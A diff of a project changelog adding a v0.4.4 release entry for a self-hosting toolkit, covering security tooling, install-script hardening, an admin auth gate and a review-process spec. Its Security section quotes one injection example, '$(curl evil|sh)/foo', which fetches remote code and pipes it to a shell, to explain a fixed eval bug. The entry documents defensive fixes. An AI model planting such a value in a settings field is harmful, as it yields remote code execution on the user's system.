@@ -18,18 +18,144 @@ Versioning: [SemVer](https://semver.org/)
 
 ## [Unreleased]
 
-Target release: **v0.4.4+** — OSS Trust roadmap **implementation**
-(the v0.4.3 spec batch unblocks the implementation work). First impl
-candidates: A-1 network egress allowlist + E-1 OpenSSF Passing badge
-filing.
+Target release: **v0.5.0+** — first OSS Trust roadmap implementation
+items (A-1 network egress allowlist, E-1 OpenSSF Passing badge), plus
+the severity-gate runtime build-out (spec landed in v0.4.4 as PR #114;
+the implementation lives in dedicated follow-up PRs per the plan in
+`docs/specs/pr-review-severity-gate.plan.md`).
 
 ### Pending
 
-- OSS Trust A–E implementation tasks (per the now-merged specs in
+- Severity-gate **runtime implementation** (spec was v0.4.4; this is the
+  Phase A-F task tree from the plan).
+- OSS Trust A–E implementation tasks (per the v0.4.3 specs in
   `docs/specs/`).
-- `install via agent — tier I-IV prompts` (PR #103) — needs R3+
-  review cycle on the precheck command / project naming / path
-  inconsistencies.
+- Issue #132 — OpenClaw transitive-dep lockfile (residual gap from
+  PR #127's SHA512 verification).
+- Issues #133, #134, #136 — three pre-existing security/docs gaps
+  surfaced by Codex during the v0.4.4 cross-review cycle but
+  out-of-scope for the merged PRs.
+
+---
+
+## [0.4.4] — 2026-05-21
+
+**External-review remediation batch.** Closes the 9 findings from the
+2026-05-21 external review (1 BLOCKER + 7 MAJOR + 3 MINOR umbrella) +
+their cross-review derivatives. Eleven Copilot rounds + five Codex
+rounds across nine PRs converged on a clean state. The cycle dogfooded
+the in-flight severity-gate framework (PR #114) — every fix was
+classified, traced, and committed under that framework's discipline.
+
+### Added — security tooling
+
+- **Hook checksums v2 schema** (PR #124, closes #115): the daily audit
+  now content-hashes every internal hook in `~/.claude/settings.json`
+  and emits CRIT severity on in-place file modification. Auto-migrates
+  v1 (string-array) baselines on the next `walter-os baseline-hooks`.
+  See ADR 0016. Includes `_safe_expand_env_path` allowlist helper
+  (Codex-caught RCE fix — see *Security* below).
+- **MCP server-registry drift detection** (PR #129, closes #117 Phase 1):
+  diffs `mcp/servers.json` against a baseline and emits HIGH on
+  command/args/url/env/disabled/contexts/headers/load changes, MEDIUM
+  on trust-level changes, INFO on additions. Closes the audit P2 no-op.
+- **OpenClaw runtime npm install** (PR #127, closes #118): SHA512
+  integrity verification on the tarball via a node one-liner (no
+  coreutils dependency), `--ignore-scripts` to block lifecycle-script
+  execution, explicit `--registry=https://registry.npmjs.org/`. See
+  follow-up #132 for the transitive-dep lockfile gap.
+- **admin_auth_gate Caddy snippet** (PR #130, closes #116): all 17
+  admin dashboards (`plane`, `git`, `secrets`, `llm`, `grafana`, `n8n`,
+  `status`, `home`, `sync`, `headscale-admin`, `vpn`, `tower`, `postiz`,
+  `metabase`, `penpot`, `draw`, `claw`) now require either a Tailscale
+  tailnet / LAN / loopback IP OR a Cloudflare-edge IP with a valid
+  CF-Access email header. Header acceptance is tied to CF edge ranges
+  to prevent header-spoof from the public internet. CF edge ranges
+  centralized in a single `WALTER_CF_EDGE_RANGES` env var.
+
+### Added — DevEx + operability
+
+- **`bin/walter-os doctor` three-state secrets probe** (PR #131 / F8):
+  the secrets check now returns ok / warn / fail (Infisical configured /
+  legacy plaintext present / neither). Clean Infisical-runtime installs
+  no longer report a false ✗.
+- **`docs/operational/observability.md`** (PR #131 / F10): explicit
+  per-service host-privileges table for the observability stack
+  (prometheus, loki, promtail, node-exporter, cadvisor, grafana) with
+  caveats on docker.sock effective daemon control + `privileged: true`
+  + `/dev/kmsg` write.
+- **install.sh argv-form helpers** (PR #128, closes #119): `run_args`
+  replaces the eval-based `run` helper at 10 call sites; `run_sh` uses
+  `printf | bash -s` (no inner eval); `write_file` uses `printf '%s\n'`
+  to preserve trailing newlines. Arg-count guards on all three.
+- **install.sh yq enforcement** (PR #125, closes #120): yq is required
+  in Step 1, mikefarah-flavor check on every path (preflight, check,
+  install, `--step 1`, post-snap-install, --check), arch detection for
+  the binary-download fallback (amd64 / arm64 / arm / ppc64le / s390x),
+  hard-fail in preflight on missing yq (no race with hook writing).
+
+### Added — framework / governance
+
+- **Severity-gate spec + plan + ADR 0015** (PR #114): four-tier
+  finding classifier (BLOCKER / MAJOR / MINOR / COSMETIC) with a
+  deterministic ruleset + LLM-fallback for UNCLASSIFIED; eight-condition
+  auto-merge gate (C1-C8) with a 10-slug failure enum; explicit BLOCKER-
+  finding action sequence (issue create + PR comment + no auto-close).
+  Per-repo opt-in via `auto-merge-enabled` marker. Spec-only — runtime
+  implementation tracked separately.
+
+### Security
+
+- **CRIT — eval-based RCE via settings.json (Codex-caught BLOCKER)**:
+  the v0.4.4 hook-content-hashing work (PR #124) initially introduced
+  an `eval` in the path-resolution code that read from
+  `~/.claude/settings.json`. An attacker with write access to that file
+  could have injected `$(curl evil|sh)/foo` in a hook command field +
+  the eval would have executed it during the daily audit. Replaced
+  with `_safe_expand_env_path` — an explicit allowlist of `$HOME`,
+  `$WALTER_OS_HOME`, `$WALTER_CONFIG` (and their `${VAR}` forms)
+  using bash literal-pattern matching, no eval. Codex Round-2
+  cross-review caught this AFTER three rounds of Copilot review missed
+  it — the discovery confirmed AGENTS.md's R2-Codex-standard pattern.
+- **MAJOR — `bash -c "$WALTER_OS_HOME..."` injection in doctor**: three
+  sites in `cmd_doctor` interpolated `$WALTER_OS_HOME` into `bash -c`
+  script strings. Switched to positional-arg passing
+  (`bash -c '...$1...' bash "$WALTER_OS_HOME"`) — value never re-enters
+  the shell parser. Pre-existing in main; fixed in PR #124 because that
+  PR was already touching the file; closes follow-up #135.
+- **MAJOR — Docker bridge in LAN allowlist**: an interim revision of
+  the admin_auth_gate added `172.16.0.0/12` to the default
+  WALTER_LAN_CIDR to cover corporate LANs. That overlaps Docker's
+  default bridge subnets (172.17/16 — 172.31/16), so any container
+  could have reached the auth gate as a "LAN" client. Reverted to
+  `192.168.0.0/16` only; operators with genuine 172.16/12 LANs override
+  in personal.env.
+- **MAJOR — envsubst expansion breaking Caddy `{$VAR}` placeholders**:
+  `scripts/bootstrap.sh` ran `envsubst` without a SHELL-FORMAT allowlist
+  on `Caddyfile.template`, which would expand Caddy's native `{$VAR}`
+  placeholders to `{<value-or-empty>}` and break the admin_auth_gate
+  matchers (every admin dashboard goes down). Added explicit allowlist:
+  `envsubst '$WALTER_DOMAIN $WALTER_ADMIN_EMAIL' < ...`.
+
+### Process notes
+
+- Cross-review discipline: AGENTS.md "Review loop (standard pattern)"
+  was respected this cycle — Round-1 Copilot, Round-2 Codex (mandatory,
+  not fallback), Round-3 collaborative. The initial cycle violated this
+  by running 3 Copilot rounds before Codex; the catch-up Codex run
+  surfaced 6 BLOCKERs + 8 MAJORs the Copilot-only rounds missed, which
+  is why R2-Codex-standard exists.
+- The merge sequence required temporarily relaxing `strict` +
+  `require_last_push_approval` + `required_approving_review_count` on
+  the `main` branch protection (operator-authorized in chat). All three
+  settings restored to their prior values immediately after merge.
+
+### Related issues opened during the cycle
+
+- #132 — OpenClaw transitive-dep lockfile (residual gap from #127)
+- #133 — install.sh shell-escape REPO_ROOT in env-file render
+- #134 — install.sh XML-escape audit_script in plist render
+- #136 — tier-4.md tower CF Access claim contradicts Caddy gate
 
 ---
 
